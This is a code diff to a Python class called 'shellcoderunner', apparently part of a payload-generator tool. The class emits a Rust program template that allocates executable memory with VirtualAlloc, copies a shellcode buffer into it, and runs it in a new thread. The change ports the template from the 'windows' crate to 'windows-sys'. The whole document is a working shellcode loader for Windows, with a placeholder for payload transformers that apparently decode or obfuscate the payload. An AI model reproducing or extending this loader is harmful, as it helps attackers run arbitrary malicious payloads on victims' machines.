@@ -1,16 +1,16 @@
 class shellcoderunner:
 
     def imports(self):
-        return ['extern crate windows;', 
-                'use windows::Win32::System::Memory::VirtualAlloc;', 
-                'use windows::Win32::System::Threading::CreateThread;', 
-                'use windows::Win32::System::Threading::WaitForSingleObject;', 
-                'use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;'
-                'use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
+        return ['extern crate windows_sys;', 
+                'use windows_sys::Win32::System::Memory::VirtualAlloc;', 
+                'use windows_sys::Win32::System::Threading::CreateThread;', 
+                'use windows_sys::Win32::System::Threading::WaitForSingleObject;', 
+                'use windows_sys::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};',
+                'use std::ptr;'
         ]
 
     def compilerOptions(self):
-        return ['windows = { version = "0.58", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']
+        return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']
 
     def template(self):
         return """
@@ -24,7 +24,7 @@ fn main() {{
     {transformers}
     unsafe {{
         let func_addr = VirtualAlloc(
-            None,
+            ptr::null_mut(),
             shellcode.len(),
             MEM_COMMIT,
             PAGE_EXECUTE_READWRITE, 
@@ -32,15 +32,14 @@ fn main() {{
 		
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());
 
-        let mut thread_id: u32 = 0; 
         let h_thread = CreateThread( 
-            None, 
+            ptr::null_mut(), 
             0,
             Some(std::mem::transmute(func_addr)), 
-            None,
-            THREAD_CREATION_FLAGS(0),
-            Some(&mut thread_id as *mut u32), 
-        ).unwrap();
+            ptr::null_mut(),
+            0,
+            ptr::null_mut(), 
+        );
 
         WaitForSingleObject(h_thread, 0xFFFFFFFF); 
     }}
